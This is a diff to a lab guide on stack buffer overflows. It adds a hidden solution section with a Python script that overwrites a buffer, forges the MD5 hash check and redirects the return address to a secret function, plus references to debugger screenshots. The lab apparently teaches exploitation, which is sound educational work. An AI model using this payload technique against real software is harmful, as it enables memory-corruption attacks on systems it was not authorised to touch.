@@ -48,7 +48,7 @@ Next analyze the variables used in the `vulnerable_function`. Find the offsets
 into the stack frame (relative to the base pointer) which describes where the
 variable starts. For example:
 
-- `foo`: `rbp - 0x100`, 32 bytes
+- `foo`: `rbp - 0xA0`, 32 bytes
 - `bar`: `rbp - 0x80`, 0x60 bytes
 - `baz`: `rbp - 0x20`, 16 bytes
 
@@ -148,9 +148,9 @@ you have written over the return address with `0xAAAAAAAA` which is most likely
 not valid. And so the program triggers a memory access error called a
 [segmentation fault](https://en.wikipedia.org/wiki/Segmentation_fault).
 
-<img src="https://www.coengoedegebure.com/content/images/2018/08/memoryoverflow-1.png" alt="TODO" style="background: #fff;" />
+<img src="./memoryoverflow-1.png" alt="TODO" style="background: #fff; padding-left: 10px" />
 
-![](./memoryoverflow-1.png "Source: https://www.coengoedegebure.com/buffer-overflow-attacks-explained/")
+![]("" "Source: https://www.coengoedegebure.com/buffer-overflow-attacks-explained/")
 
 Instead of overwriting the return address with a junk value, you can redirect
 execution to an address of your choosing. Write a script that demonstrates this,
@@ -188,7 +188,13 @@ the `secret_function` in your lab guide.
 
 {{% details title="Click to reveal.." closed="true" %}}
 
-### Overwriting the hash
+### Reverse the Program
+
+![](./binja_function_overview.png "")
+
+![](./binja_local_vars_overview.png "")
+
+### Get Past the Hash Check
 
 First calculate the hash of your input.
 
@@ -214,6 +220,66 @@ sys.stdout.buffer.write(b'A'*0x40);
 # Overwrite the hash buffer with the bytes of the MD5 hash
 sys.stdout.buffer.write(b'\xd2\x89\xa9\x75\x65\xbc\x2d\x27\xac\x8b\x85\x45\xa5\xdd\xba\x45')
 ```
+
+### Redirect Execution
+
+![](./gef_crash.png "")
+
+![](./gef_pattern.png "")
+
+![](./search_pattern.png "")
+
+![](./gef_secret_function_addr.png "")
+
+```python {filename="solution_example.py"}
+#!/usr/bin/env python3
+
+import sys
+from hashlib import md5
+import struct
+
+RBP_REG_SIZE = 8
+
+
+def log(msg: str):
+    """Writes `msg` to stderr with a newline and flushes it the buffer."""
+    _ = sys.stderr.buffer.write(msg.encode() + b"\n")
+    sys.stderr.buffer.flush()
+
+
+# Generate an amount of A's (or your favorite ascii character)
+buffer_size = 0x40
+buffer_bytes = b"A" * buffer_size
+log(f"{'Input Data:':>16} {buffer_bytes.hex()[:32]}{'...' if buffer_size > 32 else ''}")
+
+# Construct the buffer
+calculated_hash = md5(buffer_bytes)
+log(f"{'Calculated Hash:':>16} {calculated_hash.hexdigest()}")
+new_hash_bytes = calculated_hash.digest()
+
+# Combine everything into a single buffer
+buffer = b"".join(
+    (
+        buffer_bytes,
+        new_hash_bytes,
+        b"B" * len(new_hash_bytes),
+        b"C" * RBP_REG_SIZE,
+        struct.pack("<Q", 0x0000555555555269),  # Return address found previously
+    )
+)
+
+# Output the buffer to stdout so it can be piped to stdin of the
+# target process.
+_ = sys.stdout.buffer.write(buffer)
+```
+
+![](./full_solution.png "")
+
+![](./gef_variable_overview.png "")
+
+![](./ran_secret_function.png "")
+
+![](./gef_overwrite_return_address.png "")
 
 {{% /details %}}
 
